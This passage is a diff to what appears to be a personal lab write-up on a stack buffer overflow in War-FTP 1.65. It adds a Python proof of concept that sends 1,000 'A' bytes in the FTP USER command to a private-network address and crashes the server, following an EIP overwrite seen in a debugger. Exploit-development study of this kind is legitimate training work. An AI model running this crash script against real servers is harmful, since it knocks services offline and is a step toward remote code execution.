@@ -62,3 +62,36 @@ This prints 1,000 As for ease of access
 #### YAAAY we have control over the EIP and have written over it with our A's 
 
 <img src="/images/immunity-EIP.png">
+
+#### I have Created An exploit that will crash the server 
+
+```python3
+#!/usr/bin/python3
+
+## War-FTP 1.65 Exploit
+
+import socket
+from urllib import response 
+
+# define the variables to be sent to the server
+ip = '192.168.164.170'
+port = 21
+buffer = b"A" * 1000
+payload = ""
+
+# create the socket to connect to the server
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect = s.connect((ip, port))
+# because there is a banner we wanna print it out 
+response = s.recv(1024)
+print(response)
+
+# sending the exploit 
+s.send(b"USER " + buffer + b"\r\n")
+response = s.recv(1024)
+print(response)
+
+# because you have to enter the pass as well 
+s.send(b"PASS parrot\r\n")
+s.close()
+```
